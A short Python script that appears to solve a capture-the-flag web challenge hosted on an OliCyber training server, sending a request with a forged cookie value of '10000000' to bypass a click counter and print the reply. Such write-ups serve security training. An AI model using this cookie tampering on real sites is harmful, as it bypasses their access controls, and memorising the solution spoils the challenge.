import requests as r
url = 'http://click-me.challs.olicyber.it/'
print(r.get(
    url, cookies={'cookies': '10000000'}
    ).text)